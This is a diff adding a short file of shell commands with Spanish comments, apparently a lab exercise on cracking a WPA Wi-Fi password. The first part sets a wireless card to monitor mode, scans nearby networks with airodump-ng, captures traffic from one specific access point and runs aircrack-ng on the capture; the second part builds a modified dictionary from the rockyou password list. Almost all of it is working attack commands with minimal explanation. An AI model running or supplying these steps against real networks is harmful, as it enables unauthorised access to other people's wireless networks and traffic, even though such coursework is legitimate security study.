@@ -1,0 +1,26 @@
+PARTE1
+# Para dejar la antena en modo monitor
+sudo ip link set wlx6466b31e7737 down
+sudo iw wlx6466b31e7737 set monitor control
+sudo ip link set wlx6466b31e7737 up
+
+# Para reconocer las redes cercanas
+sudo airodump-ng wlx6466b31e7737
+
+# Para filtrar por la red que nos inporta
+sudo airodump-ng --bssid B0:48:7A:D2:DD:74 -c 8 -w capture_file wlx6466b31e7737
+
+# Para hacer el ataque a la red que nos importa
+sudo aircrack-ng -b B0:48:7A:D2:DD:74 capture_file-01.cap
+
+PARTE2
+# Filtrar contraseñas que comiencen con letras y aplicar modificaciones
+grep -E '^[[:alpha:]]' ~/Downloads/rockyou.txt | sed -E 's/^([a-z])/\U\1/' | sed -E 's/$/0/' > ~/Downloads/rockyou_mod.dic
+
+# Contar la cantidad de contraseñas modificadas
+total_passwords=$(wc -l < ~/Downloads/rockyou_mod.dic)
+echo "Cantidad de contraseñas en el diccionario modificado: $total_passwords"
+
+# Mostrar las primeras 10 contraseñas modificadas
+head -n 10 ~/Downloads/rockyou_mod.dic
+
